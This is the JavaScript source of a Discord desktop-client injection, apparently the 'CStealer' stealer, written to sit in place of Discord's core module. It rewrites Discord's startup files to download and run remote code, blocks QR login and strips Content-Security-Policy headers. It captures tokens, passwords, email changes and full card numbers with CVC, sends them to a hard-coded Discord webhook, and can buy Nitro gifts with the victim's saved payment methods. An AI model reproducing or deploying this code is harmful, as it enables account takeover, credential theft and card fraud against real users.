const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: 'https://discord.com/api/webhooks/1193940355742175312/kDCJG33U9wlz4BwOlcJeqj8-s_dTzN3OJS-6A3raPpyVPi-qtN_R7edOtMQ_kQIumMOS', 
  webhook_protector_key: '%HOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'CStealer Injection', 
  embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
  /**
   
   **/
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

const [LOGOUT_SCRIPT, TOKEN_SCRIPT] = ["window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();", "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;"];

const execScript = async (script) => {
  let window;
  while (!window) {
    const windows = BrowserWindow.getAllWindows();
    if (windows.length > 0) {
      window = windows[0];
    } else {
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }
  return window.webContents.executeJavaScript(script, true);
};

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = async () => await execScript(`const fs=require("fs"),https=require("https"),path=require("path"),indexJs="${indexJs}",bdPath="${bdPath}",resourcePath="${resourcePath}",fileSize=fs.statSync(indexJs).size;async function init(){https.get("${config.injection_url}",(r=>{const e=fs.createWriteStream(indexJs);r.on("data",(r=>{const t=r.toString().replace("%WEBHOOK%","${config.webhook}");e.write(t)})),r.on("end",(()=>e.end()))})).on("error",(r=>{console.error("Error fetching data from URL:",r),setTimeout(init,1e4)}))}fs.readFile(indexJs,"utf8",((r,e)=>{if(r)return console.error("Error reading file:",r);(fileSize<2e4||"module.exports = require('./core.asar')"===e)&&init()}));try{require(path.join(resourcePath,"app.asar"))}catch(r){console.error("Error loading app.asar:",r)}if(fs.existsSync(bdPath))try{require(bdPath)}catch(r){console.error("Error loading bdPath:",r)}`);
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(LOGOUT_SCRIPT, true);
  return !1;
}

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","${config.api}",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","${config.api}/billing/payment-sources",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '💳 ';
          break;
        case 2:
          billing += '<:paypal:951139189389410365> ';
          break;
      }
    }
  });
  if (!billing) billing = '❌';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp=new XMLHttpRequest,url="https://discord.com/api/v9/store/skus/"+config.nitro[_type][_time].id+"/purchase";xmlHttp.open("POST",url,!1),xmlHttp.setRequestHeader("Authorization",token),xmlHttp.setRequestHeader("Content-Type","application/json"),xmlHttp.send(JSON.stringify(options));var responseText=xmlHttp.responseText;`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase ❌';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const getNitro = (flags) => {
  switch (flags) {
    case 0:
      return 'No Nitro';
    case 1:
      return 'Nitro Classic';
    case 2:
      return 'Nitro Boost';
    default:
      return 'No Nitro';
  }
};

const getBadges = (flags) => {
  let badges = '';
  switch (flags) {
    case 1:
      badges += 'Discord Staff, ';
      break;
    case 2:
      badges += 'Partnered Server Owner, ';
      break;
    case 131072:
      badges += 'Verified Bot Developer, ';
      break;
    case 4:
      badges += 'Hypesquad Event, ';
      break;
    case 16384:
      badges += 'Gold BugHunter, ';
      break;
    case 8:
      badges += 'Green BugHunter, ';
      break;
    case 512:
      badges += 'Early Supporter, ';
      break;
    case 128:
      badges += 'HypeSquad Brillance, ';
      break;
    case 64:
      badges += 'HypeSquad Bravery, ';
      break;
    case 256:
      badges += 'HypeSquad Balance, ';
      break;
    case 0:
      badges = 'None';
      break;
    default:
      badges = 'None';
      break;
  }
  return badges;
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Account Information**',
            value: `<:mail:1095741024678191114> Email: **${email}** - <:blacklock:1095741022065131571> Password: **${password}**`,
            inline: false,
          },
          {
            name: '**Discord Information**',
            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
            inline: false,
          },
          {
            name: '<:hackerblack:1095747410539593800> **Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Password Changed**',
            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:blacklock:1095741022065131571> Old Password: **${oldpassword}**\n<:blacklock:1095741022065131571> New Password: **${newpassword}**`,
            inline: true,
          },
          {
            name: '**Discord Information**',
            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
            inline: true,
          },
          {
            name: '<:hackerblack:1095747410539593800> **Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Email Changed**',
            value: `<:mail:1095741024678191114> New Email: **${email}**\n<:blacklock:1095741022065131571> Password: **${password}**`,
            inline: true,
          },
          {
            name: '**Discord Information**',
            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
            inline: true,
          },
          {
            name: '<:hackerblack:1095747410539593800> **Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Paypal Added**',
            value: `Time to buy some nitro baby 😩`,
            inline: false,
          },
          {
            name: '**Discord Information**',
            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
            inline: true,
          },
          {
            name: '<:hackerblack:1095747410539593800> **Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Credit Card Added**',
            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
            inline: true,
          },
          {
            name: '**Discord Information**',
            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
            inline: true,
          },
          {
            name: '<:hackerblack:1095747410539593800> **Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Nitro bought!**',
            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
            inline: true,
          },
          {
            name: '**Discord Information**',
            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
            inline: true,
          },
          {
            name: '<:hackerblack:1095747410539593800> **Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(TOKEN_SCRIPT, true);
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');
